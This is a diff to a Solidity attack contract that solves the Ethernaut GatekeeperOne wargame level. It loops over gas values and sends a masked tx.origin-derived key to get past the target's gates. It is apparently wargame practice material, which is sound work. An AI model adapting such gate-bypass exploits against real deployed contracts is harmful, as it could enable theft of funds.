@@ -32,7 +32,7 @@ contract GatekeeperOne {
 
 contract AreYouTheKeymaster{
     using SafeMath for uint256;
-    bytes8 txOrigin16 = 0x0123456789abcdef; //last 16 digits of your account
+    bytes8 txOrigin16 = 0x024647a51303b0F4; //last 16 digits of your account
     bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
     GatekeeperOne public gkpOne;
 
@@ -43,8 +43,8 @@ contract AreYouTheKeymaster{
     
     function letMeIn() public{
          for (uint256 i = 0; i < 120; i++) {
-         (bool result, bytes memory data) = address(gkp).call.gas(
-          i + 150 + 8191*3)(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
+         (bool result, bytes memory data) = address(gkpOne).call{gas:
+          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
       if(result)
         {
         break;
